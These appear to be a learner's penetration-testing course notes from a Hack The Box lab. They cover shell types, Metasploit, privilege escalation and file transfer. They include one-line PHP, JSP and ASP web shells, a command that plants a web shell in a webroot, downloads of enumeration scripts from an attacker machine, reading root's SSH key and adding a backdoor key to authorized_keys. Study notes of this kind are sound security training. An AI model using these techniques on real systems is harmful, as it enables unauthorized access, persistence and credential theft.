<!-- Common Terms -->
<!-- There are three main types of shell connections: -->
<!-- Shell Type / Description
Reverse shell / Initiates a connection back to a "listener" on our attack box.
Bind shell / "Binds" to a specific port on the target host and waits for a connection from our attack box.
Web shell / Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.-->

<!-- There are two categories of ports, Transmission Control Protocol (TCP), and User Datagram Protocol (UDP). -->
<!-- TCP is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients. -->
<!-- UDP utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. UDP is useful when error correction/checking is either not needed or is handled by the application itself. UDP is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with TCP and can significantly affect a real-time system.  -->

<!-- the Open Web Application Security Project (OWASP), The current OWASP Top 10 list is: -->
<!-- Number / Category / Description
1.	Broken Access Control / Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
2.	Cryptographic Failures / Failures related to cryptography which often leads to sensitive data exposure or system compromise.
3.	Injection / User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.
4.	Insecure Design / These issues happen when the application is not designed with security in mind.
5.	Security Misconfiguration / Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
6.	Vulnerable and Outdated Components / Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.
7.	Identification and Authentication Failures / Authentication-related attacks that target user's identity, authentication, and session management.
8.	Software and Data Integrity Failures / Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).
9.	Security Logging and Monitoring Failures / This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..
10.	Server-Side Request Forgery / SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). -->


<!-- Basic Tools -->
<!-- Using Netcat : Netcat, ncat, or nc, is an excellent network utility for interacting with TCP/UDP ports. -->

<!-- Public Exploits -->
<!-- Finding Public Exploits : Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with exploit to see if we get any results: -->
<!-- A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command: -->
Warstone@htb[/htb]$ sudo apt install exploitdb -y
<!-- Then, we can use searchsploit to search for a specific application by its name, as follows: -->

<!-- Metasploit Primer -->
<!-- The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:
Running reconnaissance scripts to enumerate remote hosts and compromised targets
Verification scripts to test the existence of a vulnerability without actually compromising the target
Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
Many post-exploitation and pivoting tools-->
<!-- To run Metasploit, we can use the msfconsole command: -->
Warstone@htb[/htb]$ msfconsole
<!-- Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously: -->
msf6 > search exploit eternalblue

<!-- Reverse Shell -->
<!-- Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system. -->
<!-- The first step is to start a netcat listener on a port of our choosing: -->
Warstone@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
<!-- -l	Listen mode, to wait for a connection to connect to us.
-v	Verbose mode, so that we know when we receive a connection.
-n	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
-p 1234	Port number netcat is listening on, and the reverse connection should be sent to. -->
<!-- Connect Back IP : first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the following command -->

<!-- Bind Shell -->
<!-- Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port. -->
<!-- Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. -->
<!-- Bind Shell Command -->

<!-- Upgrading TTY (TeleType Writer) -->
<!-- Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. -->
<!-- To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY. -->
<!-- There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY: -->
Warstone@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
<!-- After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command: -->
www-data@remotehost$ ^Z

Warstone@htb[/htb]$ stty raw -echo
Warstone@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
<!-- Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. -->
<!-- At this point, we would have a fully working TTY shell with command history and everything else. -->
<!-- We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables -->
<!-- We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables: -->
Warstone@htb[/htb]$ echo $TERM

xterm-256color
<!-- AND -->
Warstone@htb[/htb]$ stty size

67 318
<!-- The first command showed us the TERM variable, and the second shows us the values for rows and columns, respectively. Now that we have our variables, we can go back to our netcat shell and use the following command to correct them: -->
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318

<!-- Web Shell -->
<!-- A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page. -->
<!-- Writing a Web Shell -->
<!-- First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. -->
<!--  A web shell script is typically a one-liner that is very short and can be memorized easily -->
<!-- The following are some common short web shell scripts for common web languages: -->
<!-- Code: php -->
<?php system($_REQUEST["cmd"]); ?>
<!-- Code: jsp -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<!-- Code: asp -->
<% eval request("cmd") %>
<!-- Uploading a Web Shell -->
<!-- Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser -->
<!-- This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands. -->
<!-- However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. -->
<!-- So, the first step is to identify where the webroot is. The following are the default webroots for common web servers: -->
<!-- Web Server / 	Default Webroot
Apache /	/var/www/html/
Nginx  / 	/usr/local/nginx/html/
IIS    /   	c:\inetpub\wwwroot\
XAMPP  /	C:\xampp\htdocs\ -->
<!-- We can check these directories to see which webroot is in use and then use echo to write out our web shell. -->
<!-- For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command: -->
<!-- Code: bash -->
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
<!-- Accessing Web Shell -->
<!-- Once we write our web shell, we can either access it through a browser or by using cURL -->
<!-- We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command: -->
http://SERVER_IP:PORT/shell.php?cmd=id
<!-- The browser will show us pertinent information -->
<!-- Another option is to use cURL: -->
Warstone@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
<!-- A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. -->
<!-- Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again. -->
<!-- On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. -->
<!--  Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal. -->

<!-- The above command requires a password to run any commands with sudo. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password: -->
Warstone@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
<!-- The NOPASSWD entry shows that the /bin/echo command can be executed without a password. -->
<!-- This would be useful if we gained access to the server through a vulnerability and did not have the user's password. -->
<!-- As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:-->
Warstone@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
<!-- Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user.  -->
<!--  GTFOBins contains a list of commands and how they can be exploited through sudo. -->
<!-- We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have. -->
<!-- LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user. -->

<!-- Scheduled Tasks -->
<!-- There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges: -->
<!-- Add new scheduled tasks/cron jobs
Trick them to execute a malicious software -->
<!-- The easiest way is to check if we are allowed to add new scheduled tasks. -->
<!-- There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include: -->
<!-- /etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root -->
<!-- If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed. -->

<!-- Exposed Credentials -->
<!-- Next, we can look for files we can read and see if they contain any exposed credentials. -->
<!-- This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). -->
<!-- The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below: -->
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
<!-- As we can see, the database password 'password123' is exposed, which would allow us to log in to the local mysql databases and look for interesting information.  -->
<!-- We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows: -->
Warstone@htb[/htb]$ su -

Password: password123
whoami

root
<!-- We may also use the user credentials to ssh into the server as that user. -->

<!-- SSH Keys -->
<!-- If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. -->
<!--  If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it: -->
Warstone@htb[/htb]$ vim id_rsa
Warstone@htb[/htb]$ chmod 600 id_rsa
Warstone@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
<!-- Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working. -->
<!-- If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys -->
<!--  This technique is usually used to gain ssh access after gaining a shell as that user -->
<!-- The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user -->
<!-- We must first create a new key with ssh-keygen and the -f flag to specify the output file: -->
Warstone@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
<!-- This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. -->
<!-- Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys: -->
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
<!-- Now, the remote server should allow us to log in as that user by using our private key: -->
Warstone@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 

<!-- See also : ssh user1@104.248.160.75 -p32317 / then sudo -l and sudo -u user2 /bin/bash / cd user2 and ls to find and cat flag.txt -->
<!-- See also : cat /root/.ssh/id_rsa (then copy key text) , sudo vim id_rsa (paste), (then) sudo chmod 600 id_rsa, (afterwards) sudo ssh root@104.248.160.75 -p32317 -i id_rsa / ls find and cat flag.txt (always remember to do proper enumeration of archives)-->


<!-- Transferring Files -->
<!--  tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file -->

<!-- Using wget -->
<!-- There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. -->
<!-- First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it: -->
Warstone@htb[/htb]$ cd /tmp
Warstone@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<!-- Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on: -->
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
<!-- Note that we used our IP 10.10.14.1 and the port our Python server runs on 8000 -->
<!-- If the remote server does not have wget, we can use cURL to download the file: -->
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
<!-- Note that we used the -o flag to specify the output file name. -->

<!-- Using SCP -->
<!-- granted we have obtained ssh user credentials on the remote host. We can do so as follows: -->
Warstone@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
<!-- Note that we specified the local file name after scp, and the remote directory will be saved to after the :. -->

<!-- Using Base64 -->
<!-- In some cases, we may not be able to transfer the file.  -->
<!-- For example, the remote host may have firewall protections that prevent us from downloading a file from our machine -->
<!--  In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it.  -->
<!-- For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows: -->
Warstone@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
<!-- Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file: -->
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

<!--  -Validating File Transfers->
<!-- To validate the format of a file, we can run the file command on it: -->
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
<!-- As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it.  -->
<!-- To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash.  -->
<!-- On our machine, we can run md5sum on it: -->
Warstone@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
<!-- Now, we can go to the remote server and run the same command on the file we transferred: -->
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
<!-- As we can see, both files have the same md5 hash, meaning the file was transferred correctly. -->
<!-- There are various other methods for transferring files. You can check out the File Transfers module for a more detailed study on transferring files. -->


<!--  Aside from blogs related to retired HTB boxes, it is also worth seeking out blog write-ups on recent exploits/attacks, Active Directory exploitation techniques, CTF event write-ups, and bug bounty report write-ups.  -->

<!-- So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the Metasploit module -->
<!-- Now, to use the exploit mentioned above, we will need valid admin credentials. -->
<!-- We can try some authorization bypass techniques and common credential pairs manually, such as admin:admin and admin:password, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message Nibbleblog security error - Blacklist protection. -->
<!-- Let us go back to our directory brute-forcing results. -->
<!-- The 200 status codes show pages/directories that are directly accessible. -->
<!-- The 403 status codes in the output indicate that access to these resources is forbidden -->
<!-- Finally, the 301 is a permanent redirect. Let us explore each of these. -->
<!-- Browsing to nibbleblog/themes/. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around? -->
<!-- Browsing to nibbleblog/content shows some interesting subdirectories public, private, and tmp. Digging around for a while, we find a users.xml file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using xmllint.-->

<!-- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability

An admin portal at nibbleblog/admin.php

Directory listing which confirmed that admin is a valid username

Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table -->

<!-- There are no other ports open, and we did not find any other directories.  -->

<!-- Common Pitfalls -->
<!-- VPN Issues -->
<!-- Still Connected to VPN -->
<!-- The easiest method of checking if we have successfully connected to the VPN network is by checking whether we have Initialization Sequence Completed at the end of our VPN connection messages: -->
Warstone@htb[/htb]$ sudo openvpn ./htb.ovpn

...SNIP...

Initialization Sequence Completed
<!-- Getting VPN Address -->
<!-- Another way of checking whether we are connected to the VPN network is by checking our VPN tun0 address, which we can find with the following command: -->
Warstone@htb[/htb]$ ip -4 a show tun0

6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.10.1/23 scope global tun0
       valid_lft forever preferred_lft forever
<!-- As long we get our IP back, then we should be connected to the VPN network. -->
<!-- Checking Routing Table -->
<!-- Another way to check for connectivity is to use the command sudo netstat -rn to view our routing table: -->
Warstone@htb[/htb]$ sudo netstat -rn

[sudo] password for user:

<!-- Finally, we can either attack an assigned target host on the 10.129.0.0/16 network or begin enumeration for live hosts. -->
<!-- Working on Two Devices -->
<!-- The HTB VPN cannot be connected to more than one device simultaneously -->
<!-- Checking Region -->
<!-- If we feel a noticeable lag in our VPN connection, such as latency in pings or ssh connections, we should ensure that we are connected to the most appropriate region. -->
<!-- To change our VPN Server, go to HackTheBox, click on the top-right icon that says Lab Access or Offline, click on Labs, and then click on OpenVPN.  -->
<!-- Once we do, we should be able to pick our VPN server location and pick any of the servers within that region: -->

<!-- Burp Suite Proxy Issues -->
<!-- Burp Suite is a web application proxy and can cause a few issues on our systems. -->
<!-- Not Disabling Proxy -->
<!-- When we turn the Burp proxy in our browser, Burp will start to capture our traffic and intercept our requests. -->
<!-- This will make it stop any requests we make in the browser, i.e., visiting a page until we go to Burp, examine the request, and forward the request. -->
<!-- A common pitfall is forgetting to turn off the browser proxy after closing Burp, so it keeps intercepting our requests. -->
<!-- If this happens, we will see that our browser is not loading any pages, so we should check if the browser proxy is still on. -->
<!-- We can do that by clicking on the Foxy Proxy plugin icon in Firefox, and making sure it's set to Turn Off: -->
<!-- If we are not using a plugin like Foxy Proxy, we can check the browser's connection settings and make sure the proxy is turned off. Once we do, we should be able to continue browsing without any issues. -->

<!-- Changing SSH Key and Password -->
<!-- In case we start facing some issues with connecting to SSH servers or connecting to our machine from a remote server, we may want to renew or change our SSH key and password to make sure they are not causing any issues.  -->
<!-- We can do this with the ssh-keygen command, as follows: -->
Warstone@htb[/htb]$ ssh-keygen
